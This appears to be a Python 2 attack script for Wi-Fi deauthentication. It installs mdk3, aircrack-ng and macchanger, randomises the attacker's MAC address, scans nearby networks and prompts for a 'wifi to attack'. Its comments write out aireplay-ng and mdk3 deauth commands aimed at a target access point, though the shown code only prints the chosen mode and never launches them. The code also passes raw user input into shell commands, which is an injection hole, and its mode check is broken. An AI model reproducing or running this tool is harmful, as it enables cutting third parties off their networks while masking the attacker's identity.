import os
import sys
import string

#########################
#aireplay-ng -0 0 -a CC:B2:55:FD:41:DA wlan0mon
#mdk3 wlan0mon d -n "Hooop"
#| awk '{print FS2 $2}
#nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SECURITY,SSID, dev wifi list ifname $card | awk '{print FS2 $2}' | sed '2p; d' (BSSID)
#nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname $card | awk '{print FS2 $7}' | sed '2p; d' (ESSID)
###########################


print("Check dependencies: ")
print("")

os.system('test /usr/bin/python  && echo "[+] Python ok" || apt-get -y install python')
os.system('test /usr/bin/mdk3 && echo "[+] Mdk3 ok" || apt-get -y install mdk3')
os.system('test /usr/bin/nmcli && echo "[+] Nmcli ok" || apt-get -y install nmcli')
os.system('test /usr/bin/aircrack-ng && echo "[+] Aircrack-ng ok" || apt-get -y install aircrack-ng')
os.system('test /usr/bin/macchanger && echo "[+] MacChanger ok" || apt-get -y install macchanger')
print("")

print("Listing Wireless extensions: ")
os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' > card.txt && cat -n card.txt")
print("")

wlancard = raw_input("Please select one Wireless extension: ")
os.system('cat card.txt | grep -n ^ | grep '+wlancard+' | cut -d: -f2 > card.sh')
print("")

print("Changing the mac addrrs: ")
os.system('card=`cat card.sh` && ifconfig $card down && macchanger -r $card && ifconfig $card up')
print("Chose the way for deauth attack: ")
os.system('test /usr/bin/mdk3 && echo "1: [+] Mdk3 ok" || echo "1: [!] Mdk3 off"')
os.system('test /usr/bin/aircrack-ng && echo "2: [+] Aircrack-ng ok" || echo "1: [!] Aireplay-ng off"')
way=raw_input("Please Select or install manualy if your choose is off!: ")
print("")
print("")

print("Detecting Wireless Networks: ")
os.system('card=`cat card.sh` && nmcli device wifi rescan ifname $card')
os.system('card=`cat card.sh` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SECURITY,SSID, dev wifi list ifname $card')
print("")

choose=raw_input("Choose the wifi to attack: ")
if way == 1:
  print("you choose mdk attackmode!")
else:
  print("you choose aireplay attackmode!")


print("Return configurations: ")
os.system('card=`cat card.sh` && ifconfig $card down && macchanger -p $card && ifconfig $card up')
